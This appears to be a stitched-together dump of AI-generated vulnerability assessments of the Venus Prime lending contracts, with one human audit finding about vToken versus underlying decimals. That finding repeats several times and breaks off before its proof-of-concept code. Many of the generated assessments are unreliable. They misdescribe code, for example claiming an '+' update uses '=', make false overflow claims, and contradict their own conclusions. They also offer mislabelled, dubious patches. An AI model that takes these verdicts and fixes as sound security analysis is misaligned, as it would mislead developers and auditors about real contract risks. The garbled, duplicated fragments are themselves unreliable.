balance.\n\nThe smart contract code does not have any logic that would lead to a mismatch between the amount of debt reduced and the collateral seized, which means that it is not vulnerable to this particular type of vulnerability.",

It then uses this value to calculate the collateral worth based on the exchange rate and supply of tokens. The contract then uses the borrow balance, collateral worth, and supply to calculate the capital value. Finally, it calculates the score by multiplying the capital value with a fixed factor (alphaNumerator / alphaDenominator) and returns the result.\n\nThe vulnerability you mentioned requires that the smart contract incorrectly assumes the high collateral share to be valid and reduces the user's debt accordingly, leading to a mismatch between the actual collateral available and the reduced debt. However, in the given code, the contract takes into account the collateral worth and debt value when calculating the collateral share, which ensures that it does not exceed the actual collateral that the user holds within the system. Therefore, the smart contract is not vulnerable to this type of attack.\n\nNote that while the given code may not be directly vulnerable to Liquidation Imbalance and Collateral Discrepancy, it may still have other weaknesses or vulnerabilities that could be exploited by an attacker.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

                "raw": "  Based on the given vulnerability knowledge, I would say that the smart contract code is vulnerable to flash loan attacks. Here are three parts of my answer:\n\n1. Yes. The vulnerability arises when there is no gap between the maximal Loan-to-Value (LTV) and the liquidation LTV in a lending protocol, allowing users to be liquidated immediately after taking maximal debt. In this case, there is no gap between the `maxLtv` and the `liquidationLtv`, which means that once a user reaches their `maxLtv` limit, they are eligible for liquidation, regardless of whether they have enough collateral to cover their debt or not. This can potentially result in increased uncovered and bad debt for the protocol, impacting both user positions and the long-term stability of the system.\n2. Flash loan attack. The vulnerability is specifically a flash loan attack, where an attacker borrows a large amount of assets from the protocol and then immediately repays them, effectively draining the user's collateral and causing them to be liquidated. This can be done by manipulating the `borrow` function to allow users to borrow more assets than they actually have in their collateral, and then using the `liquidate` function to forcefully liquidate the position without allowing the user enough time to add or remove collateral.\n3. To mitigate this vulnerability, a liquidation LTV that is larger than the maximal borrow LTV should be added, ensuring that positions can only be liquidated after reaching the liquidation LTV threshold. This allows for sufficient room for price fluctuations and grants users the opportunity to increase their collateral or decrease debt before facing liquidation. In the given code, this is not implemented, which makes it vulnerable to flash loan attacks.",

For example, in the following line of code:\n```javascript\nuint256 supply = (exchangeRate * balanceOfAccount) / EXP_SCALE;\n```\nThe multiplication of `exchangeRate` and `balanceOfAccount` can potentially result in an overflow if either of these values is very large, since the product of two 256-bit numbers has a maximum value of approximately 1.16 x 10^77, which exceeds the maximum size that can be held by a uint256 variable type.\n\nSimilarly, in the following line of code:\n```javascript\ncapital = capital * (10 ** (18 - vToken.decimals()));\n```\nThe multiplication of `capital` and `(10 ** (18 - vToken.decimals()))` can potentially result in an overflow if `vToken.decimals()` returns a large value, since the product of two 256-bit numbers has a maximum value of approximately 1.16 x 10^77, which exceeds the maximum size that can be held by a uint256 variable type.\n\nTo prevent this vulnerability, developers should use safe math operations that revert the transaction if an overflow would occur, reduce the precision factors used in computations or perform the multiplication in steps, checking for possible overflows at each stage, and consider the appropriate scaling of input variables to ensure that intermediate results remain within safe bounds for the data types used.",

The function `calculateScore` calculates the score by first calculating the capital for score and then multiplying it by the xvs balance for score. This ensures that the debt reduction is matched with the collection of collateral, which helps prevent a mismatch where the debt is reduced more than it should be based on the actual collateral available.\n\nOverall, while there may be other vulnerabilities in the smart contract code, the given knowledge suggests that it is not vulnerable to the LIDD attack.",

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

As a result, any user who transfers their participation to a new account after the shutdown can claim rewards as though they had been participating all along, using an outdated checkpoint value and disregarding the non-updated reward state for the new account.

This can be done by adding a conditional statement to ensure that the reward distribution mechanism is only updated during normal operation and not during exceptional states such as shutdowns.\n\nHere's an example patch:\n```scss\nfunction accrueInterest(address vToken) public {\n    // Check if the system is in an exceptional state (e.g., shutdown)\n    if (exceptionalState == true) return;\n\n    ...\n}\n```\nWith this patch, the `accrueInterest` function will only be updated during normal operation and not during exceptional states such as shutdowns, which should help mitigate the state update omission vulnerability.",

The vulnerability arises from the fact that the smart contract does not properly handle the timing of the `accrueInterest()` function call.\n\nHere's how the attack works: When a user calls the `accrueInterest()` function, they must pass in an address for a vToken (a tokenized version of a particular underlying asset). The function then checks whether the specified market exists and retrieves the total income unreleased from the Prime Liquidity Provider (PLP) and the current distribution index. It then calculates the amount of accrued interest that has not yet been released to users by comparing the current balance with the previous balance.\n\nThe vulnerability lies in the fact that the smart contract does not ensure that all `accrueInterest()` function calls are processed in a consistent order. Specifically, an attacker can call the function multiple times with different vToken addresses before any of the previous calls have been processed by the smart contract. If one of these calls is executed first, it will update the distribution index for that particular market without considering the changes made by the other pending calls.\n\nThis means that when the smart contract processes the remaining pending `accrueInterest()` function calls in a later block, it may use an outdated value for the distribution index, leading to incorrect reward calculations and potentially even loss of tokens due to incorrect transfer logic. This type of vulnerability is known as \"front-running,\" because an attacker can exploit it by making strategic transactions that are executed before others in order to manipulate the smart contract's behavior.\n\nTo mitigate this vulnerability, you could implement a solution similar to the following:\n\n1.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

However, these checks are not properly isolated from each other, and therefore it is possible for both conditions to be true simultaneously, leading to the function prematurely returning without performing all necessary actions.

However, the `accrueInterest` function also uses the `tokenAmountAccrued` function from the Prime Liquidity Provider contract, which can be called by any user and may cause a reentrancy attack if it is not properly secured.\n\nTo address this vulnerability, I would suggest adding additional checks to prevent reentry into the `accrueInterest` function, such as using the `reentryChecker` library or other reentrancy protection measures. Additionally, it may be necessary to modify the `getReward` function to ensure that it is not vulnerable to a reentrancy attack when calculating the reward amount for each user.",

This vulnerability occurs when the claimed rewards are not properly updated in the system, leading to repeated claims and potential exhaustion of the rewards pool.\n\nHere's why:\nThe function `accrueInterest()` is responsible for calculating and distributing accumulated interest from various sources, including the Prime Liquidity Provider (PLP) and the Protocol Share Reserve (PSR). However, it does not properly update the claimed rewards. Instead, it sets the claimed amount equal to the due amount by using the `=` operator in the following line of code:\n```scss\nmarkets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\nThis means that the user can repeatedly claim rewards until the rewards pool is almost depleted. To mitigate this vulnerability, the claimed amount should be incremented by the due rewards instead of setting it equal to the due amount.\n\nTherefore, based on the given smart contract code and vulnerability knowledge, the answer is: yes, the smart contract code is susceptible to an \"Incorrectly updating claimed rewards\" type of vulnerability.",

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

This type of attack occurs when an attacker is able to predict the outcome of a transaction before it is confirmed by the network, and then uses this information to manipulate the outcome of subsequent transactions.\n\nIn the given code, there are several potential sources of vulnerability:\n\n1. **Unprotected multiplication**: The code performs multiplications without protecting against overflow or underflow conditions. This can lead to incorrect results and potentially allow for attacks that take advantage of these errors. For example, in the calculation of `exponentiation`, if the value of `ratio` is very large, the result of `FixedMath.exp(ln(ratio) * alphaNumerator / alphaDenominator)` may overflow or underflow, leading to incorrect results.\n2. **No sanity checks**: The code does not perform any sanity checks on the inputs passed to the function. This can lead to unexpected behavior and potentially allow for attacks that manipulate the inputs in unexpected ways. For example, if an attacker passes a value of 0 for `alphaNumerator` or `alphaDenominator`, the result of the calculation may be incorrect.\n3. **No protection against underflow**: The code does not protect against underflow conditions, which can occur when the result of a calculation is rounded to zero. This can lead to incorrect results and potentially allow for attacks that take advantage of these errors. For example, if an attacker passes a very small value for `capital` or `xvs`, the result of the calculation may be rounded to zero, leading to incorrect results.\n4. **No protection against overflow**: The code does not protect against overflow conditions, which can occur when the result of a calculation is too large to fit in the available storage space. This can lead to unexpected behavior and potentially allow for attacks that manipulate the inputs in unexpected ways.

The answer is yes, and the type of vulnerability is High Severity (Potential for Unintended Execution).\n\nThe reason for this conclusion is that the smart contract code uses the `FixedMath` library to perform calculations involving decimals. However, the `FixedMath` library does not handle overflows properly, which can lead to unexpected behavior in certain situations. In particular, when the exponentiation calculation involves large values and a potential overflow occurs, it can cause the contract to crash or behave unintentionally.\n\nTo illustrate this vulnerability, let's consider an example: suppose we have two variables `xvs` and `capital`, both of which are unsigned integers with a maximum value of 2^256 - 1. Suppose further that `alphaNumerator` is equal to 10, and `alphaDenominator` is equal to 4. If we call the `calculateScore` function with these values, the code will perform an exponentiation calculation as follows:\n```c\n// (xvs / capital) or (capital / xvs), always in range (0, 1)\nint256 ratio = lessxvsThanCapital ? FixedMath.toFixed(xvs, capital) : FixedMath.toFixed(capital, xvs);\n\n// e ^ ( ln(ratio) * \ud835\udf70 )\nint256 exponentiation = FixedMath.exp(\n    (FixedMath.ln(ratio) * alphaNumerator.toInt256()) / alphaDenominator.toInt256()\n);\n```\nSuppose that `xvs` is equal to 10^32 and `capital` is equal to 10^33. Then, the value of `ratio` will be around 0.00000001, which is a very small number. However, when we compute `exponentiation`, the result may not fit in an integer variable, and it can cause an overflow. This can lead to unexpected behavior in the contract, such as crashing or behaving un",

The function `calculateScore` uses the `FixedMath` library to perform various calculations involving exponents and logarithms, which may result in an overflow error if the exponent or logarithm values are too large.\n\nThe specific vulnerability is caused by the inconsistent handling of decimals in the contract. The function `calculateScore` takes four parameters: `xvs`, `capital`, `alphaNumerator`, and `alphaDenominator`. The `xvs` and `capital` parameters are scaled to a fixed number of decimal places using the `FixedMath` library, but the `alphaNumerator` and `alphaDenominator` parameters are not. This means that if the values of `alphaNumerator` and `alphaDenominator` are too large, they may cause an overflow error in the exponentiation calculation.\n\nTo exploit this vulnerability, an attacker would need to find a way to manipulate the values of `xvs`, `capital`, `alphaNumerator`, and `alphaDenominator` such that the exponentiation calculation results in an overflow error. This could be done by carefully crafting the input parameters or exploiting a separate vulnerability in the contract.\n\nTo patch this vulnerability, the developer should ensure that all four parameters are scaled to a fixed number of decimal places using the `FixedMath` library before performing any exponentiation calculations. Additionally, the developer should consider using a different approach for calculating the score, such as using a more precise calculation method or reducing the precision of the input parameters.\n\nIn summary, the given smart contract code is vulnerable to an overflow attack caused by inconsistent handling of decimals in the `calculateScore` function.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1.

The reason for this is that the `calculateScore` function calculates the score based on the ratio of `xvs` and `capital`, but it does not take into account the fact that there may be funding fees in the system that could affect the total voting power.\n\nMore specifically, the vulnerability arises from the line `int256 exponentiation = FixedMath.exp((FixedMath.ln(ratio) * alphaNumerator.toInt256()) / alphaDenominator.toInt256());`, which calculates the score based on the ratio of `xvs` and `capital`. However, this calculation does not take into account any fees that may be charged by the system for funding transactions, which could potentially skew the total voting power in favor of certain users.\n\nTo fix this vulnerability, you could modify the `calculateScore` function to take into account the funding fees by adding a new parameter to the function that represents the fee rate and then using that value when calculating the score. For example:\n```csharp\nfunction calculateScore(uint256 xvs, uint256 capital, uint256 alphaNumerator, uint256 alphaDenominator, uint256 feeRate) internal pure returns (uint256) {\n    // Calculate the score based on the ratio of xvs and capital, taking into account the fee rate\n    int256 exponentiation = FixedMath.exp((FixedMath.ln(ratio) * alphaNumerator.toInt256()) / (alphaDenominator.toInt256() - feeRate));\n\n    // ... rest of the function unchanged ...\n}\n```\nBy adding this new parameter, you can ensure that the total voting power is correctly calculated and takes into account any funding fees that may be present in the system.",

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

Yes, this smart contract is vulnerable to a faulty calculation of collateralization.\n2. Type of vulnerability: Off-chain data manipulation (collateral conversion).\n3. Reason for vulnerability: The function `_capitalForScore` in the smart contract code calculates the borrowing limit and liquidation price for a user based on their share of collateral in a particular market. However, there is an error in the calculation of the collateral value due to a precision factor (EXP_SCALE) being used incorrectly. This can result in improper loan approval or inaccurate liquidation procedures, leading to potential losses for the protocol and further financial risks.",

The function `_capitalForScore` takes in three parameters: `xvs`, `borrow`, and `supply`, all of which are unsigned integers. It then uses these values to calculate the prices of assets using the `oracle.getPrice()` and `oracle.getUnderlyingPrice()` functions, which return the price of a given asset in USD.\n\nThe function then uses these prices to calculate the total value of the collateral (i.e., the sum of the supply and borrow amounts) and checks whether it exceeds the maximum amount that can be supplied or borrowed for a given market. If either value exceeds its maximum, the function reduces the respective value by scaling it down by a factor of `EXP_SCALE`.\n\nHowever, there is a potential vulnerability in this code. The `borrowCapUSD` and `supplyCapUSD` variables are calculated using the `xvsPrice`, which is the price of XVS tokens, but they are also multiplied by the borrow and supply multipliers, respectively, which are also stored as unsigned integers. This means that if one of these values exceeds its maximum, it may cause an underflow or overflow error in the calculation, resulting in incorrect results.\n\nTo mitigate this vulnerability, the function could be modified to use `SafeMath` functions for arithmetic operations involving `borrowCapUSD`, `supplyCapUSD`, and `xvsPrice`. Alternatively, the function could be refactored to use a more robust method of calculating collateral values that takes into account the limitations of unsigned integer arithmetic.\n\nIn conclusion, the given smart contract code appears to be vulnerable to an underflow or overflow attack due to the use of unsigned integers in the calculation of collateral values.

The vulnerability arises from the use of the `EXP_SCALE` constant, which is a large integer value with many decimal places. When multiplying other values by this constant, it could result in an overflow if the product exceeds the maximum size that can be held by the variable type (e.g., uint256).\n\nThe smart contract code involves financial computations where large numbers are multiplied together without proper checks or the use of safe math libraries that prevent such overflows. For example, in the `borrowCapUSD` and `supplyCapUSD` calculations, the product of `xvsPrice`, `market.borrowMultiplier`, and `EXP_SCALE` could result in an overflow if the values are too large. Similarly, in the `borrowUSD` and `supplyUSD` calculations, the product of `tokenPrice`, `supply`, and `EXP_SCALE` could also result in an overflow if the values are too large.\n\nTo prevent this vulnerability, the smart contract should utilize safe math operations that revert the transaction if an overflow would occur or reduce the precision factors used in computations to ensure that intermediate results remain within safe bounds for the data types used.

This is because these variables are stored as uint256 data types, which have a maximum size of 2^256 - 1. If the product of these multiplications exceeds this limit, it will cause an overflow and result in incorrect calculations.\n\nTo fix this vulnerability, developers should utilize safe math operations that revert the transaction if an overflow would occur. This can be achieved by using a library such as OpenZeppelin's SafeMath library or by performing the multiplication in steps, checking for possible overflows at each stage.

This can cause repeated and potentially repetitive collateral seizures, causing penalties and losses for the borrower.\n\nTo mitigate this vulnerability, the smart contract code should include a distinct liquidation threshold that exceeds the maximum LTV ratio by a comfortable margin, creating a protection layer that allows loan adjustments in response to market changes, preventing unnecessary and repeated liquidations, and contributing to a more resilient lending system.",

Instead, it appears to be designed to ensure that users are only allowed to take on maximum debt up until a certain point in the future before they become eligible for liquidation.\n\nThe code defines a function called `_capitalForScore` that takes four input parameters: `xvs`, `borrow`, `supply`, and `market`.

Similarly, it checks if the user's borrow amount is greater than or equal to the borrow cap, and if so, it adjusts the borrow amount accordingly.\n\nThe final two statements in the function return the updated supply and borrow amounts, which are then used to calculate the total capital for a user's score.\n\nBased on this analysis, it does not appear that there is any vulnerability in the given code that could lead to immediate liquidation of a user's position without them being able to add more collateral or reduce debt first.",

This will ensure that a user with high leverage is only allowed to take on more debt once their collateralization ratio reaches the liquidation threshold.\n\nHere is an example of how the modified function could look like:\n```scss\nfunction _capitalForScore(\n    uint256 xvs,\n    uint256 borrow,\n    uint256 supply,\n    address market\n) internal view returns (uint256, uint256, uint256) {\n    address xvsToken = IXVSVault(xvsVault).xvsAddress();\n\n    uint256 xvsPrice = oracle.getPrice(xvsToken);\n    uint256 borrowCapUSD = (xvsPrice * ((xvs * markets[market].borrowMultiplier) / EXP_SCALE)) / EXP_SCALE;\n    uint256 supplyCapUSD = (xvsPrice * ((xvs * markets[market].supplyMultiplier) / EXP_SCALE)) / EXP_SCALE;\n\n    // Check collateralization ratio before liquidating\n    if (collateralRatio(borrow, supply, market) < liquidationThreshold) {\n        uint256 collateralizedBorrowCapUSD = borrowCapUSD * collateralizationRatio;\n        uint256 collateralizedSupplyCapUSD = supplyCapUSD * collateralizationRatio;",

                "decompose": "  Based on the given vulnerability knowledge and code snippet, it seems like the code is vulnerable to an \"Inaccurate Interest Accrual Checks in Borrowing Function\" type of vulnerability. The reason for this is that the interest accrual check is performed after verifying if the borrower's current debt and credit limit, which might lead to the borrowers borrowing more than their allowed limit. This could potentially allow borrowers to exceed their maximum allowed borrow balance and credit limit, as these checks are performed before the updated interest accrual is accounted for.\n\nHere's how the vulnerability arises:\n\n1. First, the code calculates the borrower's total debt and credit limit based on their current xvs balance and market conditions. This calculation is done by calling `oracle.getPrice(xvsToken)` to get the xvs price, then multiplying the xvs balance by a borrow or supply multiplier depending on whether the borrower is supplying or borrowing.\n2. Next, the code verifies if the borrower's total debt and credit limit are exceeded. If they are, it adjusts the amount of tokens that can be borrowed or supplied accordingly.\n3. However, the vulnerability arises because the interest accrual check is performed after these checks. This means that even if the borrower's current debt and credit limit have not been updated to reflect any new interest accrued since the last time they borrowed or supplied tokens, the code will still allow them to continue borrowing or supplying tokens based on their old limits.\n4. The reason for this is that the `oracle.getPrice(xvsToken)` function used in step 1 is only updated after the interest accrual check has been performed. This means that if a borrower's total debt and credit limit have not been updated to reflect any new interest accrued since their last borrowing or supplying tokens, they will be able to continue borrowing or supplying more than their allowed limit based on the outdated xvs price.\n5. To mitigate this vulnerability, it is essential to call the interest accrual function at the beginning of the function to ensure an accurate update of the borrower's debt and credit limits. This will",
                "poc_patch": "  Based on the given vulnerability knowledge and the smart contract code provided, I can conclude that the code is potentially vulnerable to the \"Inaccurate Interest Accrual Checks in Borrowing Functions\" vulnerability.\n\nThe reason for this conclusion is that the `borrowCapUSD` and `supplyCapUSD` variables are calculated based on the current exchange rate of the XVS token, which may be outdated by the time the interest accrual function is called. Therefore, if the borrow or supply cap has already been exceeded before the interest accrual function is called, it could potentially lead to the borrower's debt and credit limit being updated incorrectly, potentially allowing them to exceed their allowed balance.\n\nTo mitigate this vulnerability, one potential solution would be to call the interest accrual function at the beginning of the `_capitalForScore` function to ensure that the debt and credit limits are accurately updated before any other calculations are performed. This could involve changing the code as follows:\n```scss\nfunction _capitalForScore(\n    uint256 xvs,\n    uint256 borrow,\n    uint256 supply,\n    address market\n) internal view returns (uint256, uint256, uint256) {\n    // Call the interest accrual function at the beginning of the function\n    _interestAccrual();\n\n    ...\n```\nAnother potential solution would be to use a different approach to calculating the borrow and supply caps that does not rely on the current exchange rate of the XVS token. For example, they could calculate the caps based on the previous period's interest accrual rate instead. This would ensure that the debt and credit limits are accurately updated before any other calculations are performed.\n\nOverall, while the code provided is not vulnerable to the \"Inaccurate Interest Accrual Checks in Borrowing Functions\" vulnerability in its current form, it could potentially be made more secure by addressing this issue through one of the two potential solutions outlined above.",

